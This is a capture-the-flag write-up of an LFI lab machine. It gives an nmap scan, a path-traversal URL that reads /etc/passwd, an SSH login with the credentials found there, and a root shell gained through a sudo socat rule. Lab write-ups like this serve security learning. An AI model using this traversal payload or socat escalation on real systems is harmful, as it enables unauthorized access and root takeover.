# LFI Vulnerability

[!If you want to check my notes about IDORs](https://github.com/itKhalid143/websec100/blob/main/Days/Day8-LFI%20%26%26%20RFI.md)

***

## user.txt

First We make an nmap scan!
```java
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDH1X4Cqbxb5okQZBN3LvsIM8dYZOxeMWlReUkWWp+ICQ+6RjVs+bSbShCPac1Zc+lbnfHte1ZRtMW8a3OodW02+8PXcDbZlmMNMWUQmM76D2NZz28PDC7vouYqSQGt6J6gfsTq2YqCMVPU28uoJ/Qvg5C6hM3oFFDztV2BN7Pj+SgZ8a5htxv5wgn/PtWju2CJCQzPhLUrkAlrSb97/YQcvtjwXUGzKGHo62Cl6GINLm3nAVqJnNpm7aWcKowdfnEsrp+S41W5xV1gl4CyvE9usk5LfQwlPDF50FCgzsidA7mn4NbTukdTsNMAOTe0oAmjXAE0q/KCT076stYjRphX
|   256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPvYRKovqOIYhJN1NV8r3T3YTa4N40XFZaWSQjuYyZIsuL6D8Xn9C4v925gPkS/wZyYBh7CRt6CcSbd2ekPByzo=
|   256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAd782HHJj9kHBKUMOUOgfWVBU9LdeGrlTDQ+Z0hD8yI
80/tcp open  http    syn-ack Werkzeug httpd 0.16.0 (Python 3.6.9)
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
|_http-title: My blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### After our result, we can see we have 2 open ports! which are 22/80

### Let check the Website!


- My eyes went directly to ```LFI-attack``` post, as this room was for LFI.
![****](/Pictures/1.PNG)

- First thing we can see, this text is weird! then I thought that could be a file loaded from the host using execute function! Then why not Input different path in the Url! and this was my payload:

```
http://10.10.216.81/article?name=../../../../etc/passwd
```
![****](/Pictures/2.PNG)

- And here we have the username and the password! let try to SSH!
```
ssh falconfeast@10.10.216.81 
```
### Boom! We're in!

![****](/Pictures/user.PNG)

## root.txt

- First thing I go is! 
```
sudo -l
```
the result was!

![****](/Pictures/root.PNG)

```java
Matching Defaults entries for falconfeast on inclusion:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falconfeast may run the following commands on inclusion:
    (root) NOPASSWD: /usr/bin/socat
```

Here we can run ```/usr/bin/socat``` as root! a quick search on gtfobins, the payload is ready
```php
sudo /usr/bin/socat stdin exec:/bin/sh
``` 

![****](/Pictures/root2.PNG)

#Thank you!